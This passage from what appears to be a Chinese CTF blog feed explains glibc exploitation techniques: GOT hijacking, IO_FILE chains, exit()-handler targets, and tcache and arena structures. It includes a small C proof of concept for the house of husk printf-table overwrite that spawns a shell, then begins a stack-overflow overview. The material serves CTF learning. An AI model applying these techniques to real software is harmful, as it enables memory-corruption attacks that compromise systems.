class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /sysdeps/alpha/strlen.S</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">ENTRY(<span class="built_in">strlen</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PROF</span></span><br><span class="line">ldgpgp, <span class="number">0</span>(pv)</span><br><span class="line">ldaAT, _mcount</span><br><span class="line">jsrAT, (AT), _mcount</span><br><span class="line">.prologue <span class="number">1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">.prologue <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">ldq_u   t0, <span class="number">0</span>(a0)<span class="meta"># load first quadword (a0 may be misaligned)</span></span><br><span class="line">lda     t1, <span class="number">-1</span>(zero)</span><br><span class="line">insqh   t1, a0, t1</span><br><span class="line">andnot  a0, <span class="number">7</span>, v0</span><br><span class="line">or      t1, t0, t0</span><br><span class="line">nop<span class="meta"># dual issue the next two on ev5</span></span><br><span class="line">cmpbge  zero, t0, t1# t1 &lt;- bitmask: bit i == <span class="number">1</span> &lt;==&gt; i-th byte == <span class="number">0</span></span><br><span class="line">bne     t1, $found</span><br><span class="line"></span><br><span class="line">$loop:ldq     t0, <span class="number">8</span>(v0)</span><br><span class="line">addq    v0, <span class="number">8</span>, v0<span class="meta"># addr += 8</span></span><br><span class="line">cmpbge  zero, t0, t1</span><br><span class="line">beq     t1, $loop</span><br><span class="line"></span><br><span class="line">$found:negq    t1, t2<span class="meta"># clear all but least set bit</span></span><br><span class="line">and     t1, t2, t1</span><br><span class="line"></span><br><span class="line">and     t1, <span class="number">0xf0</span>, t2<span class="meta"># binary search for that set bit</span></span><br><span class="line">andt1, <span class="number">0xcc</span>, t3</span><br><span class="line">andt1, <span class="number">0xaa</span>, t4</span><br><span class="line">cmovnet2, <span class="number">4</span>, t2</span><br><span class="line">cmovnet3, <span class="number">2</span>, t3</span><br><span class="line">cmovnet4, <span class="number">1</span>, t4</span><br><span class="line">addqt2, t3, t2</span><br><span class="line">addqv0, t4, v0</span><br><span class="line">addqv0, t2, v0</span><br><span class="line">nop<span class="meta"># dual issue next two on ev4 and ev5</span></span><br><span class="line"></span><br><span class="line">subq    v0, a0, v0</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">END(<span class="built_in">strlen</span>)</span><br><span class="line">libc_hidden_builtin_def (<span class="built_in">strlen</span>)</span><br></pre></td></tr></table></figure><p>发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。</p><p>笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。</p><p>由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。</p><p>而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。</p><p>同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。</p><p>其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数</p><p>此外，很多字符串相关函数，都会调用got表中123的函数，因此可以通过此来劫持。</p><p>不过在最近的比赛中，笔者打算使用libc.got 时，发现高版本libc似乎很多libc got链用不了了。</p><p>同时@kylebot 使用angr挖掘IO_FILE链启发了我，笔者打算写一个用argn挖掘可利用的libc.got的工具  #TODO  稍微鸽一下（</p><h3 id="IO-FILE">IO_FILE</h3><p>在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流</p><ul><li>house of apple 2/house of cat: <code>_IO_wide_data</code><ul><li>主打一个简单方便</li></ul></li><li>house of Lys<ul><li>主要在于，一般而言，用largebin attack进行攻击时，IO_FILE 的头我们是控制不了的，所以house of apple2存在一些不方便的地方。</li><li>而house of Lys和house of apple2一样简单，并且不需要控制head</li></ul></li><li>house of kiwi: <code>_IO_file_jumps</code><ul><li>缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert</li></ul></li><li>house of emma: <code>_IO_cookie_jumps</code><ul><li>需要能控制pointer_guard</li></ul></li></ul><p>如果要找到更多的IO_FILE 链呢？</p><p><a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/#more">可以用angr自动化挖掘IO FILE链接</a></p><h3 id="exit">exit()</h3><p><a href="https://www.anquanke.com/post/id/243196">exit</a> 的流程在这篇blog中已经讲述得很详细了，</p><p>攻击点如下</p><ul><li>__run_exit_handles中的__exit_funcs<ul><li>需要绕过pointer_guard</li></ul></li><li><strong>rtld_global的l_info（指向ELF的Dynamic段）</strong><ul><li>这是一个ld地址，所以和libc的地址可能会有一些不确定的偏移（和版本有关，可以开个对应版本的docker看看）</li><li>虽然Dynamic 段的结构是&lt;idx，偏移&gt;，但其实，l_info 的解析过程中，并不会检测其idx，所以其实只需要伪造偏移就行</li><li>通过控制l_info对应idx可以控制dl_fini的析构，主要是两种： fini_array 和 fini<ul><li>fini_array可以用来控制orw</li><li>fini可以控制到一个函数执行，一般用one_gadget</li></ul></li></ul></li><li>直接修改libc的__libc_atexit节或者elf的fini_array<ul><li>然而一个很现实的问题是这两个东西在高版本都已经不可写了</li></ul></li></ul><h3 id="printf-fmt">printf-fmt</h3><p>这一条链来自house of husk的攻击手法<br>主要是对libc格式化字符串解析过程的攻击。</p><p>先看libc是如何解析格式化字符传，通过跟踪调试可以发现，其解析字符是 <code>printf_positional</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>此函数里面通过 <code>__parse_one_cmb</code> 解析格式化字符串，并将其转换为相应specs结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>而在这个解析函数存在这样一个亮点</p><ul><li>如果<code>__printf_function_table != 0</code></li><li>并且<code>__printf_arginfo_table[spec-&gt;info.spec] != 0</code></li></ul><p>那么就会调用 <code>__printf_arginfo_table[spec-&gt;info.spec]</code><br>这里的info-&gt;spec就是我们的格式化字符(例如’s’, ‘d’)</p><p>查看这两个地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x401000 r--p     1000      0 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x401000           0x402000 r-xp     1000   1000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x402000           0x403000 r--p     1000   2000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x403000           0x404000 r--p     1000   2000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x404000           0x405000 rw-p     1000   3000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">    0x7ffff7dc4000     0x7ffff7dc6000 rw-p     2000      0 [anon_7ffff7dc4]</span><br><span class="line">    0x7ffff7dc6000     0x7ffff7dec000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7dec000     0x7ffff7f49000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f49000     0x7ffff7f96000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f96000     0x7ffff7f9a000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9a000     0x7ffff7f9c000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9c000     0x7ffff7fa6000 rw-p     a000      0 [anon_7ffff7f9c]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__printf_arginfo_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">8 = (printf_arginfo_size_function ***) 0x7ffff7f9b8b0 &lt;__printf_arginfo_table&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p __printf_function_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">9 = (printf_function **) 0x1000</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__printf_function_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10 = (printf_function ***) 0x7ffff7f9c9a0 &lt;__printf_function_table&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这两个的地址都是libc地址，如果存在两个libc任意写，就可以实现劫持。</p><p>不过其第一个参数是 spec-&gt;info， info的第一个成员是格式化的输出长度，如果没有指定，就是-1。</p><p>然而，一般程序是不会让你控制输出长度（也就是格式化字符前面的数字），所以并没有什么用处，大概率你是控制不了的，只能打one_gadgat。</p><p>写了个poc验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Init Got&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *libc = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)<span class="number">0x404000</span><span class="number">-0x55c20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Libc: %p\n&quot;</span>, libc);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_arginfo[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_arginfo[<span class="string">&#x27;s&#x27;</span>] = libc + <span class="number">0x4f390</span>; <span class="comment">// system</span></span><br><span class="line">    <span class="comment">//fake_arginfo[&#x27;s&#x27;] = libc + 0xfb41f;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *print_function = libc + <span class="number">0x1d69a0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *print_arginfo = libc + <span class="number">0x1d58b0</span>;</span><br><span class="line"></span><br><span class="line">    *print_arginfo = fake_arginfo;</span><br><span class="line">    *print_function = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: %6845243s&quot;</span>);</span><br><span class="line">    <span class="comment">// u32(b&#x27;;sh\x00&#x27;) = 6845243</span></span><br><span class="line">    <span class="comment">// printf(&quot;Enter a number: %1&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="辅助攻击">辅助攻击</h2><h3 id="tcache-perthread-struct">tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS]; <span class="comment">// 2*0x40 = 0x80</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// 8*0x40 = 0x200</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">// 0x20+0x10*0x40 = 0x420  </span></span><br></pre></td></tr></table></figure><p>tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。<br>在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。</p><p>一般是作为辅助攻击的方法，可以简化攻击链。</p><h4 id="example">example</h4><p>[[2021-DownUnder-note]]</p><h3 id="global-max-fast">global_max_fast</h3><p>实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。</p><h3 id="heap-info">heap_info</h3><p>直接攻击堆管理结构体，可以看看这篇帖子:<a href="http://phrack.org/issues/66/10.html">house-of-mind</a><br>#TODO</p><h1 id="Tricks">Tricks</h1><h2 id="多线程堆">多线程堆</h2><h3 id="堆布局与分配">堆布局与分配</h3><p>以下基于libc 2.35版本讲述</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x56234a398000     0x56234a399000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a399000     0x56234a39a000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39a000     0x56234a39b000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39b000     0x56234a39c000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39c000     0x56234a39f000 rw-p     3000   3000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234b28e000     0x56234b2af000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7fc4627fd000     0x7fc4627fe000 ---p     1000      0 [anon_7fc4627fd]</span><br><span class="line">    0x7fc4627fe000     0x7fc462ffe000 rw-p   800000      0 [anon_7fc4627fe]</span><br><span class="line">    0x7fc462ffe000     0x7fc462fff000 ---p     1000      0 [anon_7fc462ffe]</span><br><span class="line">    0x7fc462fff000     0x7fc4637ff000 rw-p   800000      0 [anon_7fc462fff]</span><br><span class="line">    0x7fc4637ff000     0x7fc463800000 ---p     1000      0 [anon_7fc4637ff]</span><br><span class="line">    0x7fc463800000     0x7fc464000000 rw-p   800000      0 [anon_7fc463800]</span><br><span class="line">    0x7fc464000000     0x7fc464021000 rw-p    21000      0 [anon_7fc464000]</span><br><span class="line">    0x7fc464021000     0x7fc468000000 ---p  3fdf000      0 [anon_7fc464021]</span><br><span class="line">    0x7fc4685fa000     0x7fc4685fb000 ---p     1000      0 [anon_7fc4685fa]</span><br><span class="line">    0x7fc4685fb000     0x7fc468dfb000 rw-p   800000      0 [anon_7fc4685fb]</span><br><span class="line">    0x7fc468dfb000     0x7fc468dfc000 ---p     1000      0 [anon_7fc468dfb]</span><br><span class="line">    0x7fc468dfc000     0x7fc4695fc000 rw-p   800000      0 [anon_7fc468dfc]</span><br><span class="line">    0x7fc4695fc000     0x7fc4695fd000 ---p     1000      0 [anon_7fc4695fc]</span><br><span class="line">    0x7fc4695fd000     0x7fc469dfd000 rw-p   800000      0 [anon_7fc4695fd]</span><br><span class="line">    0x7fc469dfd000     0x7fc469dfe000 ---p     1000      0 [anon_7fc469dfd]</span><br><span class="line">    0x7fc469dfe000     0x7fc46a5fe000 rw-p   800000      0 [anon_7fc469dfe]</span><br><span class="line">    0x7fc46a5fe000     0x7fc46a5ff000 ---p     1000      0 [anon_7fc46a5fe]</span><br><span class="line">    0x7fc46a5ff000     0x7fc46adff000 rw-p   800000      0 [anon_7fc46a5ff]</span><br><span class="line">    0x7fc46adff000     0x7fc46ae00000 ---p     1000      0 [anon_7fc46adff]</span><br><span class="line">    0x7fc46ae00000     0x7fc46b600000 rw-p   800000      0 [anon_7fc46ae00]</span><br><span class="line">    0x7fc46b600000     0x7fc46b628000 r--p    28000      0 /home/nemo/Pwn/workspace/2023ycb/heap/libc-3.</span><br><span class="line">35.so</span><br></pre></td></tr></table></figure><p>在线程分配空间时，会从线程堆中分配，但并不是每一个线程都有一个单独的线程堆，arena存在一个上限。</p><p>在上述程序中，线程堆的地址就是 <code>0x7fc464000000</code> 开始的这一部分。</p><p>查看此线程堆的组成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fc464000000</span></span><br><span class="line">00:0000│  0x7fc464000000 —▸ 0x7fc464000030 ◂— 0x200000000</span><br><span class="line">01:0008│  0x7fc464000008 ◂— 0x0</span><br><span class="line">02:0010│  0x7fc464000010 ◂— 0x21000</span><br><span class="line">03:0018│  0x7fc464000018 ◂— 0x21000</span><br><span class="line">04:0020│  0x7fc464000020 ◂— 0x1000</span><br><span class="line">05:0028│  0x7fc464000028 ◂— 0x0</span><br><span class="line">06:0030│  0x7fc464000030 ◂— 0x200000000</span><br><span class="line">07:0038│  0x7fc464000038 ◂— 0x1</span><br></pre></td></tr></table></figure><p>可以看出前0x30 的部分，是mmap分配出的内存的header。</p><p>继续往下查看:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">arena 0x7fc464000030</span>           </span><br><span class="line">&#123;                  </span><br><span class="line">  mutex = 0,                  </span><br><span class="line">  flags = 2,        </span><br><span class="line">  have_fastchunks = 1,               </span><br><span class="line">  fastbinsY = &#123;0x7fc464000e10, 0x0, 0x0, 0x0, 0x7fc464000e30, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,         </span><br><span class="line">  top = 0x7fc464000fa0,       </span><br><span class="line">  last_remainder = 0x0,                            </span><br><span class="line">  bins = &#123;....&#125;</span><br><span class="line">  binmap = &#123;0, 0, 0, 0&#125;,</span><br><span class="line">  next = 0x7fc46b819c80 &lt;main_arena&gt;,</span><br><span class="line">  next_free = 0x0,</span><br><span class="line">  attached_threads = 0,</span><br><span class="line">  system_mem = 135168,</span><br><span class="line">  max_system_mem = 135168,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出从0x30开始，就是线程堆的arena</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap 0x7fc4640008d0</span>   </span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE          </span><br><span class="line">Addr: 0x7fc4640008d0                   </span><br><span class="line">Size: 0x291            </span><br><span class="line">fd: 0x7fc464000090            </span><br><span class="line">bk: 0x7fc464000090</span><br><span class="line">Allocated chunk | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000b60                    </span><br><span class="line">Size: 0x24</span><br><span class="line">Allocated chunk | PREV_INUSE | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000b80                    </span><br><span class="line">Size: 0x75</span><br><span class="line">Allocated chunk | PREV_INUSE | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000bf0                    </span><br><span class="line">Size: 0x25</span><br></pre></td></tr></table></figure><p>继续往下查看，可以看到有一个0x290大小的堆块，应该是tcache 的管理结构体，为什么是free状态呢? 笔者暂且还没有探究，不过，经过笔者的测试，在此时，分配chunk也并不走tcache，而是直接走fastbin 。 #TODO</p><h3 id="调试">调试</h3><p>查找多线程arena:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">arena</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看其next指针</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">arena &lt;next_addr&gt;</span></span><br></pre></td></tr></table></figure><p>查看多线程heap:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">heap &lt;start_addr&gt;</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">起始地址，一般偏移为0x8d0</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于heap我所知道的一切&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.StackOverflow-Overview</title>
    <link href="https://v3rdant.cn/Pwn.Stack-Overflow-Overview/"/>
    <id>https://v3rdant.cn/Pwn.Stack-Overflow-Overview/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2024-01-12T13:06:54.961Z</updated>
    
    <content type="html"><![CDATA[<h3 id="杂谈">杂谈</h3><p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p><span id="more"></span><p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p><p>怎么去看待栈溢出题呢?</p><p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p><p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p><p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p><p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p><p>当拿到一个题目时，首先思考：</p><p>是否有syscall----&gt;ret2syscall</p><p>有可读可写内存空间吗----&gt;ret2shellcode</p><p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p><p>接下来，再分门别类谈:</p><h3 id="0x1-ret2syscall">0x1.ret2syscall</h3><p>因为syscall属于相对简单的，暂且放在前面谈。</p><table><thead><tr><th style="text-align:left">%rax</th><th style="text-align:left">System call</th><th style="text-align:left">%rdi</th><th style="text-align:left">%rsi</th><th style="text-align:left">%rdx</th><th style="text-align:left">%r10</th><th style="text-align:left">%r8</th><th style="text-align:left">%r9</th></tr></thead><tbody><tr><td style="text-align:left">59</td><td style="text-align:left">sys_execve</td><td style="text-align:left">const char *filename</td><td style="text-align:left">const char *const argv[]</td><td style="text-align:left">const char *const envp[]</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p><p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p><p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p><p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p><p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p><p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p><p><strong>例题:</strong></p><p>ciscn_s_3</p><h3 id="ret2shellcode">ret2shellcode</h3><h4 id="shellcode的书写">shellcode的书写</h4><p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含非可打印字符, 